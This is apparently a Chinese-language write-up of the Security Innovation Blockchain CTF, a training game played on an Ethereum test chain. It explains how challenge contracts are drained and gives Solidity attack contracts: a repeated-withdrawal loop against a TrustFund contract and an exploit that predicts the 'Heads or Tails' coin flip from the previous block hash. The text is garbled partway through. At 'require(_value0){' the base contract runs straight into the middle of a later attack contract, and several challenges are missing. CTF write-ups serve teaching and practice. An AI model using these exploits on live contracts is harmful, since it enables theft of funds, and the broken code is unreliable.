## 介绍
Security Innovation Blockchain CTF是一个关于智能合约的ctf，任务目标是用各种漏洞和手段提取目标合约的所有以太坊  
个人感觉这个ctf更实际一点，代码给人真实环境的感觉  
目前做的人不是很多，并且我没有搜到writeup，刷刷排名进前25还是很容易的  
在做之前请切换成测试链，并且拥有6个以上的ether
* * *
### 1.Donation
题目界面有3个按钮，不用管它，如果是做ctf的话，所有的操作都在remix里做，这样就知道每一步到底干了啥。  
源文件给了2个，其中`BaseGame.sol`是所有挑战的基础，每一关的题目都会从它上面继承，并且使用里面的函数修饰器。
    pragma solidity ^0.4.2;
    //https://github.com/OpenZeppelin/zeppelin-solidity/blob/master/contracts/math/SafeMath.sol
    import "../node_modules/zeppelin-solidity/contracts/math/SafeMath.sol";
    contract BaseGame{
        using SafeMath for uint256;
        uint256 public contractBalance;
        mapping(address => bool) internal authorizedToPlay;
        event BalanceUpdate(uint256 balance);
        function BaseGame(address _home, address _player) public {
            authorizedToPlay[_home] = true;
            authorizedToPlay[_player] = true;
        }
        // This modifier is added to all external and public game functions
        // It ensures that only the correct player can interact with the game
        modifier authorized() { 
            require(authorizedToPlay[msg.sender]);
            _;
        }
        // This is called whenever the contract balance changes to synchronize the game state
        function addGameBalance(uint256 _value) internal{
            require(_value > 0);
            contractBalance = contractBalance.add(_value);
            BalanceUpdate(contractBalance);
        }
        // This is called whenever the contract balance changes to synchronize the game state    
        function subtractGameBalance(uint256 _value) internal{
            require(_value0){
                count--;
                TrustFund bank = TrustFund(addressOfbank);
                bank.withdraw();
            }
        }
        function withdraw(){
            TrustFund bank=TrustFund(addressOfbank);
            bank.withdraw();
        }
    }
开始一次，循环9次，刚好取完，gaslimit可以设置为默认的80倍(反正测试链不要钱)，如果不设置的话，就会有我上面说的第二种效果。  
### 6.Heads or Tails
这个是猜硬币题目，和第4题类似。题目里看似随机的变量，其实在调用函数的时候就已经确定下来了。  
构造：
    contract attack{
        HeadsOrTails t;
        function attack()public payable{
            t = HeadsOrTails(你的题目地址);
        }
        function atk()public payable{
            bytes32 entropy = block.blockhash(block.number-1);
            bytes1 coinFlip = entropy[0] & 1;
            for(int i=0;i<20;i++){
                if((coinFlip == 1 && true) || (coinFlip == 0 && !true)){
                t.play.value(100000000000000000 wei)(true);
            }
            if((coinFlip == 1 && false) || (coinFlip == 0 && !false)){
                t.play.value(100000000000000000 wei)(false);
            }
        }
    }
        function() public payable{ }
    }
每次赢0.05个币，20次循环取完。执行atk()的时候要附带发送2个以太以上，保证合约有钱去赌，这里我发了3个。
### 7.Record Label
这道题看起来100行代码很多，看了好一会，经过大佬指点后发现都是没用的东西。直接调用`withdrawFundsAndPayRoyalties`函数提款1
ether就行。(压轴题好奇怪。。)
## 总结
智能合约的很多特性是非常有趣的，比如可以"预测"随机数等。但是由于智能合约很多操作直接关系到以太币，也就直接关系到金钱。所以再小的漏洞危害都是十分大的。并且由于合约一经发布不能更改，更要引起人们对安全性的重视。